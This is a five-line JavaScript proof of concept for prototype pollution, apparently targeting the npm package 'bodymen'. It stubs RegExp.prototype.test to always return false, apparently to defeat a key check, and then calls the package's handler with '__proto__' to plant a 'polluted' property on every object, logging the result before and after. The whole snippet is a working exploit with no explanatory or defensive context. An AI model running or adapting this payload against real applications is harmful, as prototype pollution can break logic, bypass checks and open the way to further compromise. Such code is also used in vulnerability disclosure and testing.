RegExp.prototype.test = () => false;
const x = require('bodymen');
console.log({}.polluted);
x.handler('__proto__', 'polluted', 'yes');
console.log({}.polluted);